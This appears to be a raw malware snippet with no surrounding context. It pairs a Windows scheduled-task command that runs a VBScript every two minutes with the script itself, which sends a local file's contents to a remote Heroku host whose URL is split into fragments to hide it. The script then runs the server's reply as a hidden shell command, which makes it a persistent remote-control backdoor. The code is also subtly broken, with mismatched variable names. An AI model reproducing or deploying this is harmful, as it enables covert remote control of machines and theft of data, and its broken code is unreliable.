


schtasks /create /sc minute /mo 2 /tn "Script" /tr C:/windows/main.vbs




On Error Resume Next
Set fso  = CreateObject("Scripting.FileSystemObject")
dim text
set text = ""
Set file = fso.OpenTextFile("C:\windows\output.txt", 1)
text = file.ReadAll
file.Close
Set xml = CreateObject("MSXML2.XMLHTTP")
x.open "GET", "htt" & "p:/" & "/bcts" & "lab2" & ".he" & "ro" & "ku.c" & "om/x?x="&text, True
xml.send
set sh = CreateObject("Wscript.Shell")
sh.Run("cmd /c " & o.responseText & " > C:\windows\output.txt", 0, true)
